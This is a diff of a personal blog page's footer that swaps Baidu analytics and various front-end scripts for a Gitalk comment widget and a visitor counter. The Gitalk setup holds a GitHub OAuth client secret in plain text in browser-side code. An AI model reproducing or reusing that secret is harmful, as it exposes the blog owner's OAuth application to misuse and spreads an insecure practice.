-<script src="https://cdn.staticfile.org/popper.js/1.15.0/umd/popper.min.js"></script>
-<script src="https://cdn.staticfile.org/twitter-bootstrap/4.3.1/js/bootstrap.min.js"></script>
-<script src="https://cdn.staticfile.org/mdbootstrap/4.8.9/js/mdb.min.js"></script>
-<script src="/js/main.js"></script>
-<script>
-(function(){
-    var bp = document.createElement('script');
-    var curProtocol = window.location.protocol.split(':')[0];
-    if (curProtocol === 'https'){
-   bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
-  }
-  else{
-  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
-  }
-    var s = document.getElementsByTagName("script")[0];
-    s.parentNode.insertBefore(bp, s);
-})();
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'b00b0a7008ebc4264da3',
+        clientSecret: 'd2cd3318af9e2b076eb378ac846e0e37341260ff',
+        repo: 'blog',
+        owner: 'Lethe',
+        admin: 'Lethe',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 10,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
 </script>
 
-  <script src="/js/lazyload.js"></script>
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span><font face="Comic Sans MS">Life is a struggle.</font></span>
+        <br>
+        <span><font face="Comic Sans MS">Lethe © 2018 - 2020</font></span>
+
+        <span> · 
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
 
 
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
 
-  
-    <script src="https://cdn.staticfile.org/tocbot/4.8.0/tocbot.min.js"></script>
-  
-  <script src="/js/post.js"></script>
+          </span>
+    </div>
+</footer>
 
-
-
-  <script src="https://cdn.staticfile.org/smooth-scroll/16.1.0/smooth-scroll.min.js"></script>
-
-
-
-  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-
-<!-- Plugins -->
-
-
-  
-    <!-- Baidu Analytics -->
-    <script>
-      var _hmt = _hmt || [];
-      (function () {
-        var hm = document.createElement("script");
-        hm.src = "https://hm.baidu.com/hm.js?99792b18d5c4379d7bc5cf4bced8a563";
-        var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(hm, s);
-      })();
-    </script>
-  
-
-  
-
-  
-
-  
-
-  <!-- cnzz Analytics -->
-  
-
-
-
-  <script src="https://cdn.staticfile.org/prettify/r298/prettify.min.js"></script>
-  <script>
-    $(document).ready(function () {
-      $('pre').addClass('prettyprint  ');
-      prettyPrint();
-    })
-  </script>
-
-
-
-  <script src="https://cdn.staticfile.org/typed.js/2.0.10/typed.min.js"></script>
-  <script>
-    var typed = new Typed('#subtitle', {
-      strings: [
-        '  ',
-        "SUCTF_2019_部分复现&nbsp;",
-      ],
-      cursorChar: "_",
-      typeSpeed: 70,
-      loop: false,
-    });
-    typed.stop();
-    $(document).ready(function () {
-      $(".typed-cursor").addClass("h2");
-      typed.start();
-    });
-  </script>
-
-
-
-  <script src="https://cdn.staticfile.org/anchor-js/4.2.0/anchor.min.js"></script>
-  <script>
-    anchors.options = {
-      placement: "right",
-      visible: "false",
-      
-      icon: "§"
-      
-    };
-    var el = "h1,h2,h3,h4,h5,h6".split(",");
-    var res = [];
-    for (item of el) {
-      res.push(".markdown-body > " + item)
-    }
-    anchors.add(res.join(", "))
-  </script>
-
-
-
-  <script src="/js/local-search.js"></script>
-  <script>
-    var path = "/local-search.xml";
-    var inputArea = document.querySelector("#local-search-input");
-    inputArea.onclick = function () {
-      getSearchFile(path);
-      this.onclick = null
-    }
-  </script>
-
-
-
-  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
-  <script>
-    $("#post img:not(.no-zoom img, img[no-zoom])").each(
-      function () {
-        var element = document.createElement("a");
-        $(element).attr("data-fancybox", "images");
-        $(element).attr("href", $(this).attr("src"));
-        $(this).wrap(element);
-      }
-    );
-  </script>
-
-
-
-
-
-
-
-
-
-
-
+    </div>
 </body>
 </html>
